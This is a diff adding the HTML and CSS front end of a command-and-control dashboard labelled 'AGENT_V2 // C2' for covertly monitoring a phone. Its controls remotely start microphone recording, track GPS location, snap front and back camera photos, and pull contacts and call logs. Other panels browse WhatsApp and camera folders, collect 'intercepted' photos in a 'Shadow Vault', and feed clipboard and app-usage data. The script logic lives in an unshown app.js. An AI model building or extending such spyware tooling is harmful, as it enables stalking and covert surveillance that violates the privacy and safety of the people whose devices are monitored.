@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agent Command Center</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #050507;
+            --surface: #0e0e12;
+            --surface-accent: #16161d;
+            --primary: #5865f2;
+            --danger: #ed4245;
+            --success: #3ba55c;
+            --text: #ffffff;
+            --text-dim: #8e8e93;
+            --border: rgba(255,255,255,0.08);
+            --sidebar-w: 240px;
+        }
+
+        body {
+            margin: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            display: flex;
+            overflow: hidden;
+            width: 100%;
+        }
+
+        /* Sidebar */
+        aside {
+            width: var(--sidebar-w);
+            background: var(--surface);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+            z-index: 1000;
+            transition: transform 0.3s ease;
+        }
+
+        .logo {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            color: var(--primary);
+            margin-bottom: 40px;
+            padding-left: 10px;
+            letter-spacing: 1px;
+        }
+
+        nav {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .nav-btn {
+            background: transparent;
+            border: none;
+            color: var(--text-dim);
+            padding: 8px 12px;
+            border-radius: 8px;
+            text-align: left;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 13px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .nav-btn:hover {
+            color: var(--text);
+            background: rgba(255,255,255,0.05);
+        }
+
+        .nav-btn.active {
+            color: var(--text);
+            background: var(--primary);
+        }
+
+        /* Main Content */
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            min-width: 0;
+        }
+
+        header {
+            padding: 20px 40px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .view-content {
+            flex: 1;
+            padding: 40px;
+            overflow-y: auto;
+        }
+
+        .hidden { display: none !important; }
+
+        /* Stats Blocks */
+        .controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .card {
+            background: var(--surface-accent);
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid var(--border);
+        }
+
+        /* Buttons */
+        .btn {
+            padding: 12px 24px;
+            border-radius: 6px;
+            border: none;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-size: 12px;
+        }
+
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-danger { background: var(--danger); color: white; }
+
+        /* Lists */
+        .item-list { display: flex; flex-direction: column; gap: 12px; }
+        
+        /* Notif Card */
+        .notif-card { margin-bottom: 12px; }
+        .notif-header { display: flex; justify-content: space-between; margin-bottom: 4px; }
+        .pkg { color: var(--primary); font-family: 'JetBrains Mono'; font-size: 11px; }
+        .time { color: var(--text-dim); font-size: 11px; }
+
+        .console {
+            background: rgba(0,0,0,0.8);
+            padding: 12px;
+            border-radius: 8px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--success);
+            height: 250px;
+            overflow-y: auto;
+            border: 1px solid var(--border);
+            margin-top: 10px;
+            box-shadow: inset 0 0 10px rgba(71, 255, 116, 0.05);
+        }
+        /* Records Table */
+        .search-bar {
+            background: var(--surface-accent);
+            border: 1px solid var(--border);
+            padding: 10px 15px;
+            border-radius: 8px;
+            color: white;
+            width: 100%;
+            margin-bottom: 20px;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .records-table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 13px;
+        }
+
+        .records-table th {
+            text-align: left;
+            padding: 12px 15px;
+            color: var(--text-dim);
+            text-transform: uppercase;
+            font-size: 11px;
+            border-bottom: 1px solid var(--border);
+            letter-spacing: 0.5px;
+        }
+
+        .records-table td {
+            padding: 15px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .records-table tr:hover {
+            background: rgba(255,255,255,0.02);
+        }
+
+        .badge {
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 700;
+            background: rgba(88, 101, 242, 0.15);
+            color: var(--primary);
+        }
+        
+        /* Photo Grid */
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 20px;
+        }
+        .photo-card {
+            background: var(--surface-accent);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            transition: transform 0.2s;
+        }
+        .photo-card:hover { transform: translateY(-5px); }
+        .photo-img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            border-bottom: 1px solid var(--border);
+            cursor: pointer;
+        }
+        .photo-info { padding: 12px; font-size: 11px; }
+
+        /* Mobile Responsiveness */
+        .mobile-toggle {
+            display: none;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 0 15px 0 0;
+        }
+
+        @media (max-width: 768px) {
+            aside {
+                position: fixed;
+                height: 100vh;
+                left: 0;
+                top: 0;
+                transform: translateX(-100%);
+            }
+            aside.open {
+                transform: translateX(0);
+            }
+            .mobile-toggle {
+                display: block;
+            }
+            header {
+                padding: 15px 20px;
+            }
+            .view-content {
+                padding: 20px;
+            }
+            .controls {
+                grid-template-columns: 1fr;
+            }
+            #file-vault-grid, #shadow-vault-grid, .photo-grid {
+                grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            }
+            #view-files > div {
+                grid-template-columns: 1fr !important;
+            }
+            .records-table th, .records-table td {
+                padding: 10px;
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <aside>
+        <div class="logo">AGENT_V2 // C2</div>
+        <nav>
+            <button class="nav-btn active" data-view="dashboard">Overview</button>
+            <button class="nav-btn" data-view="recordings">Recordings</button>
+            <button class="nav-btn" data-view="notifications">
+                <span class="nav-icon">🔔</span> Notifications
+            </button>
+            <button class="nav-btn" data-view="location">
+                <span class="nav-icon">📍</span> Location
+            </button>
+            <button class="nav-btn" data-view="camera">
+                <span class="nav-icon">📷</span> Camera
+            </button>
+            <button class="nav-btn" data-view="social">
+                <span class="nav-icon">👥</span> Social Map
+            </button>
+            <button class="nav-btn" data-view="files">
+                <span class="nav-icon">📁</span> Memory Probe
+            </button>
+            <button class="nav-btn" data-view="intel">
+                <span class="nav-icon">👁️</span> Intelligence
+            </button>
+            <button class="nav-btn" data-view="console">
+                <span class="nav-icon">💻</span> System Logs
+            </button>
+        </nav>
+
+        <div style="margin-top: auto; padding-top: 20px; border-top: 1px solid var(--border);">
+            <div style="font-size: 10px; color: var(--text-dim); margin-bottom: 8px; text-transform: uppercase; font-weight: bold;">System Logs Moved to Dedicated Tab</div>
+        </div>
+    </aside>
+
+    <main>
+        <header>
+            <div style="display: flex; align-items: center;">
+                <button class="mobile-toggle" id="mobile-menu-btn">☰</button>
+                <h2 id="view-title" style="margin: 0; font-size: 18px;">Dashboard Overview</h2>
+            </div>
+            <div style="display:flex; flex-direction:column; align-items:flex-end;">
+                <div class="status-badge" id="agent-status-badge" style="color:var(--danger); font-size: 12px; font-weight: 700; display:flex; align-items:center; gap:6px;">
+                    <span style="width:8px; height:8px; border-radius:50%; background:var(--danger); display:inline-block;" id="status-dot"></span>
+                    <span>AGENT OFFLINE</span>
+                </div>
+                <div id="last-seen-text" style="font-size: 10px; color: var(--text-dim); margin-top: 2px;">Last seen: checking...</div>
+            </div>
+        </header>
+
+        <div class="view-content">
+            <!-- Dashboard View -->
+            <section id="view-dashboard">
+                <div class="controls">
+                    <div class="card">
+                        <h3>Mic Control</h3>
+                        <p style="color:var(--text-dim); font-size: 13px; margin-bottom: 20px;">Trigger remote microphone recording.</p>
+                        <div style="display:flex; gap: 10px;">
+                            <button class="btn btn-primary" id="btn-start">Start</button>
+                            <button class="btn btn-danger" id="btn-stop">Stop</button>
+                            <span id="record-timer" class="hidden" style="color: var(--danger); font-family: 'JetBrains Mono', monospace; font-size: 16px; margin-left: 10px; align-self: center; font-weight: bold; animation: pulse 1.5s infinite;">
+                                ⏱️ 00:00
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Recordings View -->
+            <section id="view-recordings" class="hidden">
+                <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+                    <input type="text" id="search-recordings" class="search-bar" placeholder="Search by date or name..." style="margin-bottom:0; flex:1;">
+                    <button class="btn btn-primary" id="btn-refresh-recordings">REFRESH</button>
+                </div>
+                
+                <table class="records-table">
+                    <thead>
+                        <tr>
+                            <th>DATE RECORDED</th>
+                            <th>FILENAME</th>
+                            <th>TYPE</th>
+                            <th style="text-align:right">ACTION</th>
+                        </tr>
+                    </thead>
+                    <tbody id="recording-table-body">
+                        <!-- Rows injected here -->
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Notifications View -->
+            <section id="view-notifications" class="hidden">
+                <div class="item-list" id="notif-list">
+                    <!-- Notifications injected here -->
+                </div>
+            </section>
+
+            <!-- Location View -->
+            <section id="view-location" class="hidden">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                    <div style="display:flex; gap:10px; align-items:center;">
+                        <button class="btn btn-primary" id="btn-locate">LOCATE AGENT</button>
+                        <button class="btn btn-secondary" id="btn-gps-toggle" style="background: rgba(255, 171, 0, 0.1); color: var(--warning); border: 1px solid rgba(255, 171, 0, 0.2);">
+                            GPS PULSE: OFF
+                        </button>
+                    </div>
+                    <div id="location-status" style="color:var(--text-dim); font-size:13px; font-weight:600;">Last seen: Unknown</div>
+                </div>
+                <div id="map" style="height: 500px; border-radius: 12px; border: 1px solid var(--border); background: var(--surface);"></div>
+            </section>
+
+            <!-- Camera View -->
+            <section id="view-camera" class="hidden">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                    <div style="display:flex; gap:10px;">
+                        <button class="btn btn-primary" id="btn-snap-front">SNAP FRONT</button>
+                        <button class="btn btn-primary" id="btn-snap-back">SNAP BACK</button>
+                    </div>
+                    <button class="btn btn-primary" id="btn-refresh-photos">REFRESH GALLERY</button>
+                </div>
+                <div id="photo-grid" class="photo-grid">
+                    <!-- Photos injected here -->
+                </div>
+            </section>
+
+            <!-- Social View -->
+            <section id="view-social" class="hidden">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                    <div style="display:flex; gap:10px;">
+                        <button class="btn btn-primary" id="btn-sync-contacts">SYNC CONTACTS</button>
+                        <button class="btn btn-primary" id="btn-sync-calls">SYNC CALL LOGS</button>
+                    </div>
+                </div>
+
+                <div class="card" style="margin-bottom:20px;">
+                    <div class="card-header">REcent Communications</div>
+                    <div class="card-body">
+                        <table style="width:100%; border-collapse:collapse;">
+                            <thead>
+                                <tr style="text-align:left; color:var(--text-dim); font-size:12px;">
+                                    <th style="padding:10px;">Name</th>
+                                    <th style="padding:10px;">Number</th>
+                                    <th style="padding:10px;">Type</th>
+                                    <th style="padding:10px;">Duration</th>
+                                    <th style="padding:10px;">Date</th>
+                                </tr>
+                            </thead>
+                            <tbody id="call-logs-list">
+                                <!-- Logs injected here -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">Phonebook Contacts</div>
+                    <div class="card-body">
+                        <table style="width:100%; border-collapse:collapse;">
+                            <thead>
+                                <tr style="text-align:left; color:var(--text-dim); font-size:12px;">
+                                    <th style="padding:10px;">Name</th>
+                                    <th style="padding:10px;">Phone Number</th>
+                                    <th style="padding:10px;">Imported At</th>
+                                </tr>
+                            </thead>
+                            <tbody id="contacts-list">
+                                <!-- Contacts injected here -->
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Files View -->
+            <section id="view-files" class="hidden">
+                <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                    <!-- Left: Manual Explorer -->
+                    <div class="card">
+                        <div class="card-header" id="current-path-header">Manual Explorer</div>
+                        <div class="card-body">
+                            <div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:10px; margin-bottom:20px;">
+                                <div class="folder-chip" id="folder-whatsapp" style="text-align:center; padding:10px; background:rgba(255,255,255,0.05); cursor:pointer;">
+                                    <div style="font-size:20px;">💬</div>
+                                    <div style="font-size:10px;">WhatsApp</div>
+                                </div>
+                                <div class="folder-chip" id="folder-downloads" style="text-align:center; padding:10px; background:rgba(255,255,255,0.05); cursor:pointer;">
+                                    <div style="font-size:20px;">⬇️</div>
+                                    <div style="font-size:10px;">Downloads</div>
+                                </div>
+                                <div class="folder-chip" id="folder-camera" style="text-align:center; padding:10px; background:rgba(255,255,255,0.05); cursor:pointer;">
+                                    <div style="font-size:20px;">📸</div>
+                                    <div style="font-size:10px;">Camera</div>
+                                </div>
+                            </div>
+
+                            <table style="width:100%; border-collapse:collapse;">
+                                <tbody id="file-list">
+                                    <!-- Files injected here -->
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <!-- Right: Phantom Discovery -->
+                    <div class="card">
+                        <div style="display:flex; justify-content:space-between; align-items:center; padding:15px; border-bottom:1px solid var(--border);">
+                           <div class="card-header" style="padding:0; border:none;">Phantom Discovery</div>
+                           <button class="btn btn-secondary" onclick="loadShadowVault()" style="font-size:10px; padding:5px 10px;">Refresh Shadow</button>
+                        </div>
+                        <div class="card-body">
+                            <div style="margin-bottom:20px;">
+                                <label style="font-size:10px; color:var(--text-dim); text-transform:uppercase; font-weight:700;">Discovered Documents</label>
+                                <div id="discovered-docs-list" style="margin-top:10px; display:flex; flex-direction:column; gap:8px; max-height:200px; overflow-y:auto;">
+                                    <!-- Hunter finds appear here -->
+                                </div>
+                            </div>
+                            <div>
+                                <label style="font-size:10px; color:var(--text-dim); text-transform:uppercase; font-weight:700;">Shadow Vault (Intercepted)</label>
+                                <div id="shadow-vault-grid" style="margin-top:10px; display:grid; grid-template-columns: repeat(2, 1fr); gap:10px; max-height:200px; overflow-y:auto;">
+                                    <!-- Shadowed photos appear here -->
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card" style="margin-top:20px;">
+                    <div class="card-header">File Vault (Vault Extracts)</div>
+                    <div class="card-body">
+                        <div id="file-vault-grid" style="display:grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap:15px;">
+                            <!-- Extracted files here -->
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Intelligence View -->
+            <section id="view-intel" class="hidden">
+                <div class="card">
+                    <div class="card-header">Live Intelligence Feed (Clipboard & App Usage)</div>
+                    <div class="card-body">
+                        <div id="intel-feed" style="display:flex; flex-direction:column; gap:10px;">
+                            <!-- Intel logs injected here -->
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Console View -->
+            <section id="view-console" class="hidden">
+                <div class="card" style="height: 100%; display: flex; flex-direction: column;">
+                    <div class="card-header" style="margin-bottom: 10px;">System Command Logs</div>
+                    <div class="console" id="console" style="flex: 1; height: auto; min-height: 500px; font-size: 13px; padding: 20px; overflow-y: auto;">> Ready...</div>
+                </div>
+            </section>
+        </div>
+    </main>
+
+    <script src="app.js"></script>
+</body>
+</html>
